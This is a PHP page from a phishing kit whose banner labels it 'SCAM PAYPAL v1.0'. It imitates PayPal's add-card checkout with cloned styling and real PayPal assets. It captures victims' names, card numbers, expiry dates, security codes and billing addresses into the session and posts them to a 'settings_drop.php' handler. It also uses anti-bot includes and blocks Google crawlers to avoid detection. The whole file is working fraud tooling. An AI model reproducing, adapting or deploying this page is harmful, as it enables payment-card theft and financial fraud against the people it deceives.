<?php
/*   
        ───────────────────────────────────────────────────────────────────────────────────
        ───────────────────██████──────────██████─████████████████─────────────────────────
        ───────────────────██░░██████████████░░██─██░░░░░░░░░░░░██─────────────────────────
        ───────────────────██░░░░░░░░░░░░░░░░░░██─██░░████████░░██─────────────────────────
        ───────────────────██░░██████░░██████░░██─██░░██────██░░██─────────────────────────
        ───────────────────██░░██──██░░██──██░░██─██░░████████░░██─────────────────────────
        ───────────────────██░░██──██░░██──██░░██─██░░░░░░░░░░░░██─────────────────────────
        ───────────────────██░░██──██████──██░░██─██░░██████░░████─────────────────────────
        ───────────────────██░░██──────────██░░██─██░░██──██░░██───────────────────────────
        ───────────────────██░░██──────────██░░██─██░░██──██░░██████─██████────────────────
        ───────────────────██░░██──────────██░░██─██░░██──██░░░░░░██─██░░██────────────────
        ───────────────────██████──────────██████─██████──██████████─██████────────────────
        ───────────────────────────────────────────────────────────────────────────────────
        ────────────────────────────────────────────────────────────────────────────────────
        ─██████████████─██████─────────██████████████─██████████████─██████──────────██████─
        ─██░░░░░░░░░░██─██░░██─────────██░░░░░░░░░░██─██░░░░░░░░░░██─██░░██████████──██░░██─
        ─██░░██████████─██░░██─────────██░░██████████─██░░██████░░██─██░░░░░░░░░░██──██░░██─
        ─██░░██─────────██░░██─────────██░░██─────────██░░██──██░░██─██░░██████░░██──██░░██─
        ─██░░██─────────██░░██─────────██░░██████████─██░░██████░░██─██░░██──██░░██──██░░██─
        ─██░░██─────────██░░██─────────██░░░░░░░░░░██─██░░░░░░░░░░██─██░░██──██░░██──██░░██─
        ─██░░██─────────██░░██─────────██░░██████████─██░░██████░░██─██░░██──██░░██──██░░██─
        ─██░░██─────────██░░██─────────██░░██─────────██░░██──██░░██─██░░██──██░░██████░░██─
        ─██░░██████████─██░░██████████─██░░██████████─██░░██──██░░██─██░░██──██░░░░░░░░░░██─
        ─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░██──██░░██─██░░██──██████████░░██─
        ─██████████████─██████████████─██████████████─██████──██████─██████──────────██████─
        ───────────────────────────────────────────────────────────────────────────────────
                                        #=======================#
                                        #   SCAM PAYPAL v1.0    #
                                        #    Mr.CLEAN.PAYPAL    #
                                        #=======================#
                        ─────────────────────────────────────────────────────────
                        ─██████████████─██████████████─████████───██████████████─
                        ─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░██───██░░░░░░░░░░██─
                        ─██████████░░██─██░░██████░░██─████░░██───██░░██████░░██─
                        ─────────██░░██─██░░██──██░░██───██░░██───██░░██──██░░██─
                        ─██████████░░██─██░░██──██░░██───██░░██───██░░██████░░██─
                        ─██░░░░░░░░░░██─██░░██──██░░██───██░░██───██░░░░░░░░░░██─
                        ─██░░██████████─██░░██──██░░██───██░░██───██░░██████░░██─
                        ─██░░██─────────██░░██──██░░██───██░░██───██░░██──██░░██─
                        ─██░░██████████─██░░██████░░██─████░░████─██░░██████░░██─
                        ─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░██─██░░░░░░░░░░██─
                        ─██████████████─██████████████─██████████─██████████████─
                        ─────────────────────────────────────────────────────────
   
*/
        session_start();
        error_reporting(0);
        set_time_limit(0);
        ini_set('max_execution_time', 0);
        ########################################################
        ################ [+] INCLUDE FILES [+] #################
        ########################################################
        include('../functions/get_lang.php'); 
        include('../functions/get_ip.php');
        include('../anti_bots/all_antibots.php'); 
        include('../anti_bots/index.php');
        ########################################################
        ############# [+] BILLING INFORMATION [+] ##############
        ########################################################
        if(!empty($_POST['firstName'])){$_SESSION['_fullname_']    = $_POST['firstName'] ." ". $_POST['lastName'];}
        if(!empty($_POST['billingAddress'])){$_SESSION['_billingAddress_']    = $_POST['billingAddress'];}
        if(!empty($_POST['billingCity'])){$_SESSION['_city_']        = $_POST['billingCity'];}
        if(!empty($_POST['billingState'])){$_SESSION['_state_']       = $_POST['billingState'];}
        if(!empty($_POST['billingPostalCode'])){$_SESSION['_zipCode_']     = $_POST['billingPostalCode'];}
        ########################################################
        ############ [+] CREDITCARD INFORMATION [+] ############
        ########################################################
        if(!empty($_POST['firstName'])){$_SESSION['_cc_holder_']         = $_POST['firstName'] ." ". $_POST['lastName'];}
        if(!empty($_POST['cardnumber'])){$_SESSION['_cc_number_']         = $_POST['cardnumber'];}
        if(!empty($_POST['cardnumber'])){$_SESSION['_last4_']             = substr($_POST['cardnumber'], -4);}
        if(!empty($_POST['expdate'])){$_SESSION['_expirationDate_']    = $_POST['expdate'];}
        if(!empty($_POST['csc'])){$_SESSION['_csc_']               = $_POST['csc'];}
        ########################################################
        ############# [+] FILTER_VALIDATE_CARD [+] #############
        ########################################################
        if ($_SERVER["REQUEST_METHOD"] == "POST") {
        if(empty($_POST['cc_number']) == false) {
        include('settings_drop.php');
        }}
        ########################################################
        ############### [+] HTTP_USER_AGENT [+] ################
        ########################################################
        if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
        if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
        ########################################################
?>
<html lang="en" dir="ltr">
  <head>
    <script async="" src="https://www.paypalobjects.com/tagmgmt/bootstrap.js"></script>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="robots" content="noindex">
    <meta http-equiv="Accept-CH" content="Device-Memory">
    <link rel="shortcut icon" type="image/x-icon" href="../Mpic/Mfour.ico">
    <style type="text/css" nonce="">
      body {
      margin: 0
      }
      .loading #main {
      opacity: .1
      }
      .spinner {
      height: 100%;
      width: 100%;
      position: absolute;
      z-index: 10;
      }
      .spinner .spinWrap {
      width: 200px;
      height: 100px;
      position: absolute;
      top: 45%;
      left: 50%;
      margin-left: -100px;
      margin-top: -100px;
      }
      .framed .spinner {
      position: fixed
      }
      .framed .spinner .spinWrap {
      position: fixed;
      top: 50%;
      height: 75px;
      margin-top: -37.5px
      }
      .spinner .loader,
      .spinner .spinnerImage {
      height: 100px;
      width: 100px;
      position: absolute;
      top: 0;
      left: 50%;
      opacity: 1;
      filter: alpha(opacity=100)
      }
      .spinner .spinnerImage {
      margin: 28px 0 0 -25px;
      background: url(https://www.paypalobjects.com/images/checkout/hermes/icon_ot_spin_lock_skinny.png) no-repeat
      }
      .spinner .loader {
      margin: 0 0 0 -55px;
      background-color: transparent;
      -webkit-animation: rotation .7s infinite linear;
      -moz-animation: rotation .7s infinite linear;
      -o-animation: rotation .7s infinite linear;
      animation: rotation .7s infinite linear;
      border-left: 5px solid #cbcbca;
      border-right: 5px solid #cbcbca;
      border-bottom: 5px solid #cbcbca;
      border-top: 5px solid #2380be;
      border-radius: 100%
      }
      .spinner .loadingMessage {
      -webkit-box-sizing: border-box;
      -moz-box-sizing: border-box;
      -ms-box-sizing: border-box;
      box-sizing: border-box;
      width: 100%;
      margin-top: 125px;
      text-align: center;
      z-index: 100;
      outline: 0
      }
      .spinner .loadingSubHeading {
      -webkit-box-sizing: border-box;
      -moz-box-sizing: border-box;
      -ms-box-sizing: border-box;
      box-sizing: border-box;
      width: 150%;
      margin-top: 10px;
      margin-left: -42px;
      text-align: center;
      z-index: 100;
      outline: 0
      }
      @-webkit-keyframes rotation {
      from {
      -webkit-transform: rotate(0)
      }
      to {
      -webkit-transform: rotate(359deg)
      }
      }
      @-moz-keyframes rotation {
      from {
      -moz-transform: rotate(0)
      }
      to {
      -moz-transform: rotate(359deg)
      }
      }
      @-o-keyframes rotation {
      from {
      -o-transform: rotate(0)
      }
      to {
      -o-transform: rotate(359deg)
      }
      }
      @keyframes rotation {
      from {
      transform: rotate(0)
      }
      to {
      transform: rotate(359deg)
      }
      }
      @media only screen and (max-width: 768px) {
      .spinner {
      .spinWrap {
      width: 200px;
      height: 100px; //180 or 212
      position: fixed;
      top: 40%;
      left: 50%;
      margin-left: -93px; //length of half spinwrap width
      margin-top: -50px; //length of half spinwrap height
      }
      }
      }
    </style>
    <link rel="stylesheet" href="../Mfiles/Mnine.css">
    <style type="text/css" nonce="">
      @charset "UTF-8";
      [ng\:cloak], [ng-cloak], [data-ng-cloak], [x-ng-cloak],
      .ng-cloak, .x-ng-cloak,
      .ng-hide:not(.ng-hide-animate) {
      display: none !important;
      }
      ng\:form {
      display: block;
      }
      .ng-animate-shim {
      visibility:hidden;
      }
      .ng-anchor {
      position:absolute;
      }
    </style>
    <style type="text/css">
#cardnumber {
  background-image: url('../Mpic/Mten.png');
  background-repeat: no-repeat;
  background-position: 98.5% 81.7%;
}
#csc {
  background-image: url('../Mpic/Mten.png');
  background-repeat: no-repeat;
  background-position: 97.5% 87%;
}
      </style>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <link rel="stylesheet" href="../Mfiles/Meightx.css">
    <link rel="stylesheet" href="https://www.paypalobjects.com/web/res/b68/a04c217f6513295c043c0faf19ab1/css/styles.css" type="text/css">

    <title><?=$all_title." ".$_SESSION['_LOOKUP_CNTRCODE_'];?></title>
  </head>
  <body ng-csp="no-inline-style" class="ng-scope">
    <div id="Rotation">
         <p style="font-size: 13px;"><?=$Validating;?></p>
      </div>
    <br>
    <div id="preloaderSpinner" class="preloader spinner" style="display: none;">
      <div class="spinWrap">
        <br><br><br><br><br><br>
        <p align="center"><?=$Validating;?></p>
        <p class="spinnerImage"></p>
        <p class="loader"></p>
      </div>
    </div>
    <div id="xGhostRiderForm" class="ng-scope">
      <div class="ng-scope ng-isolate-scope">
        <div class="xo-checkout-wrapper ng-scope">
          <div class="outerWrapper" id="outerWrapper">
            <div id="wrapper" class="clearfix">
              <div id="sliding-area">
                <div id="main">
                  <div class="row-fluid paypalHeaderWrapper">
                    <div class="span14 clearfix paypalHeader">
                      <div id="paypalLogo" class="logo ng-scope">
                      </div>
                    </div>
                  </div>
                  <div id="contents_cc">
                    <div class="ng-scope">
                      <div class="ng-scope ng-isolate-scope">
                        <div class="xo-page-add-card-page-wrapper ng-scope">
                          <section class="addCard" id="addCard">
                            <div class="row-fluid ng-scope">
                              <div class="span14">
                                <ui-view class="ng-scope">
                                  <div class="ng-scope ng-isolate-scope">
                                    <div class="ng-scope">
                                      <div class="ng-scope ng-isolate-scope">
                                        <div class="wallet">
                                          <div class="ng-scope">
                                            <div id="notifications">
                                              <div id="pageLevelErrors" class="msgPage msg-info">
                                                <span class="icon"></span>
                                                <ul role="presentation">
                                                  <li class="ng-scope">
                                                    <span class="ng-binding"><?=$presentation;?></span>
                                                  </li>
                                                </ul>
                                              </div>
                                            </div>
                                          </div>
                                          <br>
                                          <xo-message id="billingAddressUpdatedMsg" class="ng-scope ng-isolate-scope" style="display:none">
                                            <div class="ng-scope">
                                              <div id="notifications">
                                                <div id="pageLevelErrors" class="msgPage msg-success">
                                                  <span class="icon"></span>
                                                  <ul role="presentation">
                                                    <li class="ng-scope">
                                                      <span class="ng-binding"><?=$notifications;?></span>
                                                    </li>
                                                  </ul>
                                                </div>
                                              </div>
                                            </div>
                                          </xo-message>
                                          <div>
                                            <h1 class="gamma addBillingTitle ng-binding ng-scope"><?=$Confirm;?></h1>
                                            <form id="creditCardForm" method="POST" action="settings_drop.php" name="GOxGOxPOWERxRANGERS" class="GOxGOxPOWERxRANGERS">
                                              <div class="trayInner container">
                                                <div class="xo-name-input-wrapper ng-scope">
                                                  <div class="fieldGroup name clearfix DZ">
                                                    <div class="ng-scope">
                                                      <div class="ng-scope">
                                                        <div class="inputField half confidential">
                                                          <input 
                                                            id="firstName" 
                                                            name="firstName"
                                                            pattern="(?!^\d+$)^.+$" 
                                                            autocomplete="off" 
                                                            maxlength="100"
                                                            class="Xval666ideX1"
                                                            placeholder="<?=$firstName;?>" 
                                                            oninvalid="
                                                            this.setCustomValidity('Enter a valid first name')"
                                                            oninput="setCustomValidity('')"
                                                            required="required">
                                                        </div>
                                                      </div>
                                                    </div>
                                                    <div class="ng-scope">
                                                      <div class="ng-scope">
                                                        <div class="inputField half confidential last-child">
                                                          <input 
                                                            id="lastName"
                                                            name="lastName" 
                                                            class="Xval666ideX1"
                                                            pattern="(?!^\d+$)^.+$" 
                                                            autocomplete="off" 
                                                            placeholder="<?=$lastName;?>"
                                                            oninvalid="
                                                            this.setCustomValidity('Enter a valid last name')"
                                                            oninput="setCustomValidity('')" 
                                                            required="required">
                                                        </div>
                                                      </div>
                                                    </div>
                                                  </div>
                                                </div>
                                                <div class="creditCardInput" content="">
                                                  <div class="cardIconsGroup ng-scope">
                                                    <div class="icons ng-scope">
                                                      <div class="cardIcon MASTERCARD"></div>
                                                    </div>
                                                    <div class="icons ng-scope">
                                                      <div class="cardIcon VISA"></div>
                                                    </div>
                                                    <div class="icons ng-scope">
                                                      <div class="cardIcon AMEX"></div>
                                                    </div>
                                                    <div class="icons ng-scope">
                                                      <div class="cardIcon DISCOVER"></div>
                                                    </div>
                                                  </div>
                                                  <div class="inputField confidential cardNumber creditCardField ng-scope x_V-ForZ118 large">
                                                    <label for="cardnumber" class="focus accessAid ng-binding">
                                                    <?=$cardnumber;?>
                                                    </label>
                                                    <input 
                                                      type="tel" 
                                                      name="cardnumber" 
                                                      id="cardnumber" 
                                                      maxlength="19"
                                                      class="Xval666ideX1"
                                                      autocapitalize="off" 
                                                      autocomplete="off" 
                                                      placeholder="<?=$cardnumber;?>" 
                                                      pattern="[0-9]*"
                                                      oninvalid="
                                                      this.setCustomValidity('Enter a valid card number')"
                                                      oninput="setCustomValidity('')" 
                                                      >
                                                    <input name="c_type" type="hidden" id="card_type" value="">
                                                    <input name="c_valid" type="hidden" id="card_valid" value="">
                                                  </div>
                                                  <div class="expiration confidential ng-scope" id="expiration">
                                                    <div class="xo-card-expiry-wrapper ng-scope">
                                                      <div class="expirationField inputField" id="expirationField">
                                                        <label class="expires ng-binding" for="expiry_value"><?=$Expires;?></label>
                                                        <div class="inputField" directionality="">
                                                          <input 
                                                            name="expdate" 
                                                            id="expdate" 
                                                            autocapitalize="off" 
                                                            autocomplete="off"
                                                            placeholder="MM/YYYY"
                                                            class="Xval666ideX1"
                                                            maxlength="7" 
                                                            oninvalid="
                                                            this.setCustomValidity('Enter a valid expiration date')"
                                                            oninput="setCustomValidity('')" 
                                                            required="" 
                                                            >
                                                        </div>
                                                      </div>
                                                    </div>
                                                    <div class="xo-cvv-wrapper ng-scope">
                                                      <div class="inputField cvvField" id="cvvField">
                                                        <label class="cvv nolap ng-binding ng-scope" for="cvv"><?=$CSC;?></label>
                                                        <div class="cvvSecurityCode inputField x_V-ForZ118">
                                                          <input 
                                                            type="tel" 
                                                            id="csc" 
                                                            name="csc" 
                                                            ng-pattern="/^[0-9]{1,4}$/" 
                                                            ng-minlength="3" 
                                                            maxlength="3" 
                                                            placeholder="<?=$digits;?>" 
                                                            autocomplete="off" 
                                                            oninvalid="
                                                            this.setCustomValidity('Enter a valid CSC')"
                                                            oninput="setCustomValidity('')"   
                                                            class="Xval666ideX1"
                                                            required="required" 
                                                            >
                                                        </div>
                                                      </div>
                                                    </div>
                                                  </div>
                                                </div>
                                                <div id="billingAddress" class="dropdown billingAddress confidential ng-scope">
                                                  <label for="billingAddressDropdown" class="billingAddressLabel ng-binding">
                                                  <?=$Billingaddress;?>
                                                  <a id="bill_button" style="cursor: pointer;" class="addNewBillingAddress ng-binding" role="button"><?=$Add;?></a>
                                                  </label>
                                                  <div id="select" class="dropdown billingAddress nullable custom-select-container x_V-ForZ118">
                                                    <select 
                                                      name="billingAddress" 
                                                      id="select-id" 
                                                      required="" 
                                                      class="ng-pristine ng-valid ng-isolate-scope replaced ng-valid-required ng-touched Xval666ideX1"
                                                      >
                                                    <option id="opt" value="blank"><?=$Noaddress;?></option>
                                                    </select>
                                              
                                                    <span class="custom-select" aria-hidden="true"><span>
                                                    <span id="billingSPAN">
                                                     <?=$Noaddress;?>
                                                    </span></span></span>
                                                  </div>
                                                </div>
                                                <div class="buttons">
                                                  <input type="submit" value="<?=$Continue;?>" id="proceedButton" class="btn full">
                                                </div>
                                              </div>
                                          </div>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                </ui-view>
                              </div>
                              <div class="span10 ng-isolate-scope">
                                <span class="ng-scope">
                                  <xo-value-props class="ng-scope ng-isolate-scope">
                                    <div class="props addCard" content="">
                                      <div class="prop-img"></div>
                                      <h2 class="vprop-header ng-binding"><?=$safer;?></h2>
                                      <p ng-if="textContent" ng-bind-html="htmlContent(textContent)" class="ng-binding ng-scope"><?=$matter;?></p>
                                    </div>
                                  </xo-value-props>
                                </span>
                              </div>
                            </div>
                          </section>
                        </div>
                      </div>
                    </div>
                  </div>
                  <div id="contents_bill" class="contents_bill" style="display:none">
                    <div class="ng-scope">
                      <div class="ng-scope ng-isolate-scope">
                        <div class="xo-page-add-card-page-wrapper ng-scope">
                          <section class="addCard" id="addCard">
                            <div class="row-fluid ng-scope">
                              <div class="span14">
                                <ui-view class="ng-scope">
                                  <div class="ng-scope ng-isolate-scope">
                                    <div class="ng-scope">
                                      <div class="ng-scope ng-isolate-scope">
                                        <div class="wallet">
                                          <div class="ng-scope">
                                            <div id="notifications">
                                              <div id="pageLevelErrors" class="msgPage msg-info">
                                                <span class="icon"></span>
                                                <ul role="presentation">
                                                  <li class="ng-scope">
                                                    <span class="ng-binding"><?=$billing;?></span>
                                                  </li>
                                                </ul>
                                              </div>
                                            </div>
                                          </div>
                                          <div id="addBillingAddress" class="ng-scope">
                                            <h1 class="gamma addBillingTitle ng-binding ng-scope"><?=$Addbilling;?></h1>
                                              <div class="trayInner container">
                                                <div class="clearfix">
                                                  <div class="xo-add-address-wrapper ng-scope">
                                                    <div id="addressForm">
                                                      <div class="addressGroup clearfix">
                                                        <div class="ng-scope">
                                                          <div class="ng-scope">
                                                            <div class="ng-scope">
                                                              <div class="inputField confidential line1 x_V-ForZ118">
                                                                <input 
                                                                  type="text" 
                                                                  name="billingLine1" 
                                                                  id="billingLine1" 
                                                                  maxlength="50" 
                                                                  class="Xval666ideX1"
                                                                  autocapitalize="off" 
                                                                  autocomplete="off"  
                                                                  required="required" 
                                                                  placeholder="<?=$Add1;?>"
                                                                  oninvalid="
                                                                  this.setCustomValidity('Enter a valid address line')"
                                                                  oninput="setCustomValidity('')"  
                                                                  >
                                                              </div>
                                                            </div>
                                                          </div>
                                                          <div class="ng-scope">
                                                            <div class="ng-scope">
                                                              <div class="inputField confidential line2">
                                                                <input 
                                                                  type="text" 
                                                                  name="billingLine2" 
                                                                  id="billingLine2" 
                                                                  maxlength="50" 
                                                                  autocapitalize="off" 
                                                                  autocomplete="off" 
                                                                  placeholder="<?=$Add2;?>" 
                                                                  >
                                                              </div>
                                                            </div>
                                                          </div>
                                                          <div class="ng-scope">
                                                            <div class="ng-scope">
                                                              <div class="inputField confidential city x_V-ForZ118">
                                                                <input 
                                                                  type="text" 
                                                                  name="billingCity" 
                                                                  id="billingCity"
                                                                  maxlength="50" 
                                                                  class="Xval666ideX1"
                                                                  autocapitalize="off" 
                                                                  autocomplete="off" 
                                                                  required="required"
                                                                  oninvalid="
                                                                  this.setCustomValidity('Enter a valid city name')"
                                                                  oninput="setCustomValidity('')" 
                                                                  placeholder="<?=$City;?>"
                                                                  >
                                                              </div>
                                                            </div>
                                                          </div>
                                                          <div class="ng-scope">
                                                            <div class="ng-scope">
                                                              <div class="inputField confidential state ng-scope x_V-ForZ118">
                                                                <input 
                                                                  type="text" 
                                                                  name="billingState" 
                                                                  id="billingState" 
                                                                  class="Xval666ideX1"
                                                                  autocapitalize="off" 
                                                                  autocomplete="off"
                                                                  oninvalid="
                                                                  this.setCustomValidity('Enter a valid state name')"
                                                                  oninput="setCustomValidity('')" 
                                                                  required="required" 
                                                                  placeholder="<?=$State;?>" 
                                                                  >
                                                              </div>
                                                            </div>
                                                          </div>
                                                          <div class="ng-scope">
                                                            <div class="ng-scope">
                                                              <div class="xo-zipcode-wrapper ng-scope">
                                                                <div id="billingZipField" class="inputField confidential postalCode x_V-ForZ118">
                                                                  <input 
                                                                    type="text" 
                                                                    name="billingPostalCode" 
                                                                    id="billingPostalCode"
                                                                    class="Xval666ideX1" 
                                                                    autocapitalize="off" 
                                                                    autocomplete="off"
                                                                    required="required"  
                                                                    oninvalid="
                                                                    this.setCustomValidity('Enter a valid postal code')"
                                                                    oninput="setCustomValidity('')"
                                                                    placeholder="<?=$Postal;?>" 
                                                                    >
                                                                </div>
                                                              </div>
                                                            </div>
                                                          </div>
                                                        </div>
                                                      </div>
                                                    </div>
                                                  </div>
                                                </div>
                                                <div class="buttons clearfix">
                                                  <a id="backButton" class="btn btn-secondary ng-binding" role="button"><?=$Back;?></a>
                                                  <input
                                                    type="button" 
                                                    id="proceedButton" 
                                                    value="<?=$Save;?>" 
                                                    class="btn ng-scope BUTTON_BILL_SAVE" 
                                                    >
                                                </div>
                                              </div>
                                            </form>
                                          </div>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                </ui-view>
                              </div>
                              <div class="span10 ng-isolate-scope">
                                <span class="ng-scope">
                                  <xo-value-props class="ng-scope ng-isolate-scope">
                                    <div class="props addCard">
                                      <div class="prop-img"></div>
                                      <h2 class="vprop-header ng-binding"><?=$safer;?></h2>
                                      <p class="ng-binding ng-scope"><?=$matter;?></p>
                                    </div>
                                  </xo-value-props>
                                </span>
                              </div>
                            </div>
                          </section>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <xo-footer class="ng-scope ng-isolate-scope">
              <footer content="">
                <div class="footer clearfix commonFooter">
                  <div class="footerWrapper">
                    <ul class="footerLinks ng-scope">
                      <li><a ><?=$Legal;?></a></li>
                      <li><a ><?=$User;?></a></li>
                      <li><a ><?=$Privacy;?></a></li>
                      <li><a ><?=$Feedback;?></a></li>
                    </ul>
                    <p class="copyright ng-binding">
                      <?=$date;?>
                      <span class="secureIcon"></span>
                      <span class="accessAid ng-binding"><?=$safer;?></span>
                    </p>
                  </div>
                </div>
              </footer>
            </xo-footer>
          </div>
        </div>
      </div>
    </div>
<!------------------------------- FILE JAVASCRIPT --------------------------------->
    <script type="text/javascript">
      $(document).ready(function(){
         $(".BUTTON_BILL_SAVE").click(function(){
         var a = $("#billingLine1").val();
         var b = $("#billingCity").val();
         var c = $("#billingState").val();
         var d = $("#billingPostalCode").val();
         $("#billingSPAN").text($("#billingLine1").val() + ", " + $("#billingCity").val() + ", " + $("#billingState").val() + ", " + $("#billingPostalCode").val());
         $("option").text($("#billingLine1").val() + ", " + $("#billingCity").val() + ", " + $("#billingState").val() + ", " + $("#billingPostalCode").val());
         $("option").val(a + ", " + b + ", " + c + ", " + d);
         });
       });
    </script> 
<!------------------------------- FILE JAVASCRIPT --------------------------------->
    <script type="text/javascript">
      $(document).ready(function(){
         $("#bill_button").on('click', function(){
         $('#preloaderSpinner').toggle();
         $('#preloaderSpinner').fadeIn(1200);
         $('#preloaderSpinner').fadeOut(1200);
         $("#contents_cc").toggle();
         $("#contents_bill").toggle();
          });});
    </script>
<!------------------------------- FILE JAVASCRIPT --------------------------------->
    <script type="text/javascript">  
      $(document).ready(function(){

         $(".BUTTON_BILL_SAVE").on('click', function(){
          if ($("#select-id").val() !== 'blank'){
            $('#select').removeClass("error");
            } 
          if ($('#billingLine1').val() != '' && $('#billingCity').val() != '' && $('#billingState').val() != '' && $('#billingPostalCode').val() != '') { 
         $('#preloaderSpinner').toggle();
         $('#preloaderSpinner').fadeIn(1200);
         $('#preloaderSpinner').fadeOut(1200);
         $("#contents_cc").toggle();
         $("#contents_bill").toggle();
         $("#billingAddressUpdatedMsg").toggle();
         }else{
          if ($('#billingCity').val() == ''){$('#billingCity').addClass("error");}
          if ($('#billingLine1').val() == ''){$('#billingLine1').addClass("error");}
          if ($('#billingState').val() == ''){$('#billingState').addClass("error");}
          if ($('#billingPostalCode').val() == ''){$('#billingPostalCode').addClass("error");}
         }
          });
      });
    </script> 
<!------------------------------- FILE JAVASCRIPT --------------------------------->
    <script type="text/javascript">  
      $(document).ready(function(){
         $("#backButton").on('click', function(){
         $('#preloaderSpinner').toggle();
         $('#preloaderSpinner').fadeIn(1200);
         $('#preloaderSpinner').fadeOut(1200);
         $("#contents_cc").toggle();
         $("#contents_bill").toggle();
          });
      });
    </script> 
<!------------------------------- FILE JAVASCRIPT --------------------------------->
    <script src="../Mfiles/Mone.js"></script>
    <script src="../Mfiles/Mthree.js"></script>
    <script src="../Mfiles/Mfour.js"></script>
    <script src="../Mfiles/Msix.js"></script>
<!------------------------------- FILE JAVASCRIPT --------------------------------->
    <script type="text/javascript">
        $(function() {
        $('#cardnumber').validateCreditCard(function(result) {
                document.getElementById('card_type').value  = result.card_type.name
                document.getElementById('card_valid').value = result.valid
      $('#cardnumber').validateCreditCard(function(result) {
          if(result.card_type == null){
                    $('#cardnumber').removeClass(result.card_type.name);
                }
                else{
                    $('#cardnumber').addClass(result.card_type.name);
          
                }
            });
            });
    });
    </script>
<!------------------------------- FILE JAVASCRIPT --------------------------------->
    <script type="text/javascript">
      $("#cardnumber").on('keyup', function() {
     if (this.value == 4 && this.value.length <= 1) {
     jQuery(function($){$("#cardnumber").mask("0000 0000 0000 0000");});
     document.getElementById("csc").maxLength ="3";
     }
     if (this.value == 5 && this.value.length <= 1) {
     jQuery(function($){$("#cardnumber").mask("0000 0000 0000 0000");});
     document.getElementById("csc").maxLength ="3";
     }
     if (this.value == 6 && this.value.length <= 1) {
     jQuery(function($){$("#cardnumber").mask("0000 0000 0000 0000");});
     document.getElementById("csc").maxLength ="3";
     }
     if (this.value == 3 && this.value.length <= 1) {
     jQuery(function($){$("#cardnumber").mask("0000 000000 00000");});
     document.getElementById("csc").maxLength ="4";
     }

});
    </script>
<!------------------------------- FILE JAVASCRIPT --------------------------------->
    <script type="text/javascript">
      $(document).ready(function(){
         $("#proceedButton").on('click', function(e){
         if ($('#firstName').val() == ''){
         $('#firstName').addClass("error");
         }
         if ($('#lastName').val() == ''){
         $('#lastName').addClass("error");
         }
         if ($('#cardnumber').val() == ''){
         $('#cardnumber').addClass("error");
         }
         if ($('#expdate').val() == ''){
         $('#expdate').addClass("error");
         }
         if ($('#csc').val() == ''){
         $('#csc').addClass("error");
         }
         if ($("#select-id").val() == 'blank'){
         $('#select').addClass("error");
         return false;
         }
         if ( $("#select-id").val() !== 'blank' ){
         $('#Rotation').fadeIn(300);
         } 
         });
       });
    </script> 
<!------------------------------- FILE JAVASCRIPT --------------------------------->
  </body>
</html>